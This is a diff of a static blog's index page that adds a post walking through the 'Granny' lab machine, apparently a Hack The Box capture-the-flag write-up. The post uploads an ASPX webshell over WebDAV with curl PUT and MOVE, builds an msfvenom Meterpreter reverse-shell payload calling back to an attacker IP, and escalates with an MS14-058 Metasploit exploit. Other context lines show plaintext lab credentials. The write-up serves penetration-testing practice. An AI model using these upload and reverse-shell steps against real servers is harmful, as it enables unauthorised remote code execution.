@@ -71,6 +71,104 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Granny" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/21/Granny/" class="article-date">
+  <time class="dt-published" datetime="2022-07-21T11:25:32.000Z" itemprop="datePublished">2022-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/21/Granny/">Granny</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/21/Granny/nmap.png">
+it just open port 80,and the web page is a default error page
+<img src="/2022/07/21/Granny/webpage.png">
+the header shows that it's a ASP.NET,so if we can upload aspx files to it,it can excute
+<img src="/2022/07/21/Granny/asp.png">
+use dirsearch to dig pages
+<img src="/2022/07/21/Granny/dirsearch.png">
+
+<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><p>Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP.<br><img src="/2022/07/21/Granny/webDAV.png"><br>we can use <a href>davtest</a> to explore further, and it will show me what types of files can be uploaded, and if it can create a directory:</p>
+<pre><code>davtest -url http:10.10.10.15
+</code></pre>
+<img src="/2022/07/21/Granny/davtest.png">
+It looks like there are a lot of file type I can upload, but not aspx, which is what I want.
+The next step is to manul test dav
+First, I’ll put up a text file and verify it’s there:
+
+<pre><code>echo &quot;it&#39;s a test text&quot; &gt; test.txt
+curl -X PUT http://10.10.10.15/123.txt -d @test.txt
+curl http://10.10.10.15/123.txt
+</code></pre>
+<img src="/2022/07/21/Granny/curl.png">
+The first curl puts the file onto the webserver, and the second proves it’s there. The -d @123.txt syntax says that the data for the request should be the contents of the file text.txt.
+Now let's try with .aspx:
+<img src="/2022/07/21/Granny/aspx.png">
+unfortunately,it's really can't allow us to upload aspx
+
+<p>There’s a tool called <code>cadaver</code> that provides command-line WebDAV interactions with a slightly simpler syntax than curl. If I are going to be attacking a WebDAV server, I’ll probably use that just for the shorter commands. That said, I’m going to use <code>curl</code> in this post to show exactly what is happening when I issue these HTTP requests.<br><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/cadaver">cadaver</a></p>
+<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><p>Kali has a simple one at <code>/usr/share/webshells/aspx/cmdasp.aspx</code>, we should copy it </p>
+<pre><code>cp /usr/share/webshells/aspx/cmdasp.aspx .
+</code></pre>
+<p>And now we can upload that to target as a txt using curl and the http put method:</p>
+<pre><code>curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
+</code></pre>
+<p>we can see the site deal the shell as the plain text<br><img src="/2022/07/21/Granny/shelltxt.png"><br>Now we can use the next webdav command, MOVE. Again, I can do this with curl:</p>
+<pre><code>curl -X MOVE -H &#39;Destination:http://10.10.10.15/shell.aspx&#39; http://10.10.10.15/shell.txt
+</code></pre>
+<ul>
+<li>-X MOVE - use the MOVE method</li>
+<li>-H ‘Destination:<a target="_blank" rel="noopener" href="http://10.10.10.15/shell.aspx&#39;">http://10.10.10.15/shell.aspx&#39;</a> - defines where to move to</li>
+<li><a target="_blank" rel="noopener" href="http://10.10.10.15/shell.txt">http://10.10.10.15/shell.txt</a> - the file to move<br>and now we can get a shell<img src="/2022/07/21/Granny/webshell.png"></li>
+</ul>
+<h5 id="reverse-a-shell"><a href="#reverse-a-shell" class="headerlink" title="reverse a shell"></a>reverse a shell</h5><p>using msf,we can reverse a shell</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f aspx &gt; msf.aspx
+</code></pre>
+<p>like the step before,upload it and change it to aspx:</p>
+<pre><code>curl -X PUT http://10.10.10.15/msf.txt -d @msf.aspx
+curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
+</code></pre>
+<p>start msf</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre>
+<p>try to trigger it,but failed<br><img src="/2022/07/21/Granny/fail.png"><br>upload it again,and we will see the whitespace is all jacked up:<br><img src="/2022/07/21/Granny/whitespace.png"><br>upload again and use <code>--data-binary</code> to preserve endlines and other control characters</p>
+<pre><code>curl -X PUT http://10.10.10.15/msf.txt --data-binary @msf.aspx
+</code></pre>
+<p>and this time we can see it cleaner:<br><img src="/2022/07/21/Granny/msf.png"></p>
+<pre><code>curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
+</code></pre>
+<p>trigger it,and we can get s shell<br><img src="/2022/07/21/Granny/shell.png"></p>
+<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>First to checkout local exploits, and Metasploit has a nice module for that, <code>post/multi/recon/local_exploit_suggester</code><br><img src="/2022/07/21/Granny/localsuggest.png"><br>and we can use ms14-058<br>finally,we get the root<br><img src="/2022/07/21/Granny/root.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/21/Granny/" data-id="cl5v6ykmy0004yacpai0i30w0" data-title="Granny" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-FriendZone" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/07/19/FriendZone/" class="article-date">
@@ -149,7 +247,7 @@ target machine:wget http://10.10.16.10/pspy32s
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/19/FriendZone/" data-id="cl5tqbzxf00031ycp5w8cgzjh" data-title="FriendZone" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/19/FriendZone/" data-id="cl5v6ykmx0003yacp45o1bu8e" data-title="FriendZone" class="article-share-link">Share</a>
       
       
       
@@ -189,7 +287,7 @@ and add helpdesk.delivery.htb to /etc/hosts
 <pre><code>echo &quot;10.10.10.222 helpdesk.delivery.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <h4 id="2-website"><a href="#2-website" class="headerlink" title="2.website"></a>2.website</h4><p>the port 80 shows nothing,but we can change to <a target="_blank" rel="noopener" href="http://helpdesk.delivery.htb/index.php">http://helpdesk.delivery.htb/index.php</a> to get some information<br><img src="/2022/07/18/Delivery/osTicket.png"><br>it shows it’s run a osTicket structer on 80<br>and on port 8065,it shows another login page<br><img src="/2022/07/18/Delivery/mattermost.png"><br>i first add a user in mattermost and try to find a exploit<br>it need me to varify<br>so let’s use searchsploit osticket and try to exploit<br>all the register need verify<br>as a guest,we can open a new ticket and see it’s feedback<br><img src="/2022/07/18/Delivery/newticket.png"></p>
-<h4 id="3-getting-webshell-access"><a href="#3-getting-webshell-access" class="headerlink" title="3.getting webshell access"></a>3.getting webshell access</h4><p>because the machine can not access to the internet,the verify step is unable<br>but when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.<br><img src="/2022/07/18/Delivery/viewticket.png"><br>I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:<br><img src="/2022/07/18/Delivery/step1.png"><br><img src="/2022/07/18/Delivery/step2.png"><br>the default email is <a href="mailto:&#x32;&#x32;&#48;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#x65;&#108;&#105;&#118;&#101;&#x72;&#x79;&#46;&#x68;&#x74;&#98;">&#x32;&#x32;&#48;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#x65;&#108;&#105;&#118;&#101;&#x72;&#x79;&#46;&#x68;&#x74;&#98;</a><br>register a new account use <a href="mailto:&#50;&#50;&#x30;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#101;&#x6c;&#x69;&#118;&#x65;&#114;&#x79;&#x2e;&#x68;&#116;&#98;">&#50;&#50;&#x30;&#x30;&#52;&#x39;&#51;&#x40;&#x64;&#101;&#x6c;&#x69;&#118;&#x65;&#114;&#x79;&#x2e;&#x68;&#116;&#98;</a><br><img src="/2022/07/18/Delivery/step3.png"><br>check the ticketnum use 2200493<br><img src="/2022/07/18/Delivery/step4.png"><br>and now we get the verify mail<br><img src="/2022/07/18/Delivery/step5.png"><br>verify the link and we can get in<br><img src="/2022/07/18/Delivery/step6.png"><br>in the website,we can see a credential —maildeliverer:Youve_G0t_Mail!<br>and it shows a hint that may password are PleaseSubscribe!<br><img src="/2022/07/18/Delivery/creds.png"><br>then i can try to use creds i just get to ssh the machine<br><img src="/2022/07/18/Delivery/userflag.png"></p>
+<h4 id="3-getting-webshell-access"><a href="#3-getting-webshell-access" class="headerlink" title="3.getting webshell access"></a>3.getting webshell access</h4><p>because the machine can not access to the internet,the verify step is unable<br>but when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.<br><img src="/2022/07/18/Delivery/viewticket.png"><br>I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:<br><img src="/2022/07/18/Delivery/step1.png"><br><img src="/2022/07/18/Delivery/step2.png"><br>the default email is <a href="mailto:&#x32;&#x32;&#48;&#x30;&#52;&#57;&#x33;&#64;&#x64;&#x65;&#x6c;&#105;&#118;&#101;&#114;&#x79;&#x2e;&#104;&#116;&#98;">&#x32;&#x32;&#48;&#x30;&#52;&#57;&#x33;&#64;&#x64;&#x65;&#x6c;&#105;&#118;&#101;&#114;&#x79;&#x2e;&#104;&#116;&#98;</a><br>register a new account use <a href="mailto:&#50;&#x32;&#48;&#x30;&#x34;&#57;&#x33;&#x40;&#100;&#x65;&#108;&#x69;&#x76;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#98;">&#50;&#x32;&#48;&#x30;&#x34;&#57;&#x33;&#x40;&#100;&#x65;&#108;&#x69;&#x76;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#98;</a><br><img src="/2022/07/18/Delivery/step3.png"><br>check the ticketnum use 2200493<br><img src="/2022/07/18/Delivery/step4.png"><br>and now we get the verify mail<br><img src="/2022/07/18/Delivery/step5.png"><br>verify the link and we can get in<br><img src="/2022/07/18/Delivery/step6.png"><br>in the website,we can see a credential —maildeliverer:Youve_G0t_Mail!<br>and it shows a hint that may password are PleaseSubscribe!<br><img src="/2022/07/18/Delivery/creds.png"><br>then i can try to use creds i just get to ssh the machine<br><img src="/2022/07/18/Delivery/userflag.png"></p>
 <h4 id="4-getting-root-access"><a href="#4-getting-root-access" class="headerlink" title="4.getting root access"></a>4.getting root access</h4><p>Mattermost stores it’s configuration in &#x2F;opt&#x2F;mattermost&#x2F;config&#x2F;config.json. The database connection information is in here:<br><img src="/2022/07/18/Delivery/sqlpass.png"></p>
 <p>username:mmuser<br>password:Crack_The_MM_Admin_PW<br>database:mattermost<br><img src="/2022/07/18/Delivery/database.png"><br>we can get username and password from the table User</p>
 <pre><code>select Username,Password from Users;
@@ -201,7 +299,7 @@ and add helpdesk.delivery.htb to /etc/hosts
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/18/Delivery/" data-id="cl5tqbzxc00021ycp4ucv36bf" data-title="Delivery" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/18/Delivery/" data-id="cl5v6ykmu0001yacp9bm36zuu" data-title="Delivery" class="article-share-link">Share</a>
       
       
       
@@ -271,7 +369,7 @@ and use the command to get a interactive shell
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl5tqbzxh00041ycpakasb4vy" data-title="Horizontall" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl5v6ykmy0005yacph3hfg39s" data-title="Horizontall" class="article-share-link">Share</a>
       
       
       
@@ -331,7 +429,7 @@ nc -lvnp 8888
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/16/Previse/" data-id="cl5tqbzxj00061ycpfq5z6lpw" data-title="Previse" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/16/Previse/" data-id="cl5v6ykmz0007yacph3z6412u" data-title="Previse" class="article-share-link">Share</a>
       
       
       
@@ -395,7 +493,7 @@ Now let's run snap as the root user to make use of the snap package we created:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl5tqbzx500001ycpcit259nk" data-title="Armageddon" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl5v6ykmq0000yacpcxdue3f3" data-title="Armageddon" class="article-share-link">Share</a>
       
       
       
@@ -473,7 +571,7 @@ we can first see what's configured
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl5tqbzxa00011ycp8pfe1z4s" data-title="Forlic" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl5v6ykmw0002yacpe8ke1o1q" data-title="Forlic" class="article-share-link">Share</a>
       
       
       
@@ -518,7 +616,7 @@ we can first see what's configured
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5tqbzxk00071ycpc6npgete" data-title="Scriptkiddle" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5v6ykn00008yacphmm062lr" data-title="Scriptkiddle" class="article-share-link">Share</a>
       
       
       
@@ -568,7 +666,7 @@ so we can try run monitor.sh and the color of text changed
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5tqbzxi00051ycp5p7e2wzs" data-title="Nibbles" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5v6ykmz0006yacp2bh067jz" data-title="Nibbles" class="article-share-link">Share</a>
       
       
       
@@ -672,7 +770,7 @@ line 3 of code
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5tqbzxm00081ycpcn239kyy" data-title="first_blog" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5v6ykn00009yacpf7ij565o" data-title="first_blog" class="article-share-link">Share</a>
       
       
       
@@ -715,6 +813,10 @@ line 3 of code
       <ul>
         
           <li>
+            <a href="/2022/07/21/Granny/">Granny</a>
+          </li>
+        
+          <li>
             <a href="/2022/07/19/FriendZone/">FriendZone</a>
           </li>
         
@@ -728,10 +830,6 @@ line 3 of code
         
           <li>
             <a href="/2022/07/16/Previse/">Previse</a>
-          </li>
-        
-          <li>
-            <a href="/2022/07/16/Armageddon/">Armageddon</a>
           </li>
         
       </ul>
